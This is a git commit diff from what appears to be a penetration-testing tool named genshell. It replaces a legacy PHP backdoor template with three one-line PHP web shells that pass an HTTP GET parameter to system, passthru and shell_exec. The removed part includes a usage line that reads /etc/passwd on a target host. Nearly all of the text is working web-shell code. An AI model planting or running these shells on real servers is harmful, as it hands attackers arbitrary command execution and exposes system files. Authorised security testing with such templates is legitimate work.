dfdc98ac87073bfef4a8d627110aa8f163455c90
dadevel <dadevel@disroot.org>
2023-10-31 21:20:32 +0100

    cleanup php web shells

--- genshell/templates/web/simple.php
+++ genshell/templates/web/simple.php
@@ -1,18 +1,3 @@
-<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
-
-<?php
-
-if(isset($_REQUEST['cmd'])){
-        echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "</pre>";
-        die;
-}
-
-?>
-
-Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
-
-<!--    http://michaeldaw.org   2006    -->
-
+<?php system($_GET["c"]) ?>
+<?php passthru($_GET["c"]) ?>
+<?php echo shell_exec($_GET["c"]) ?>
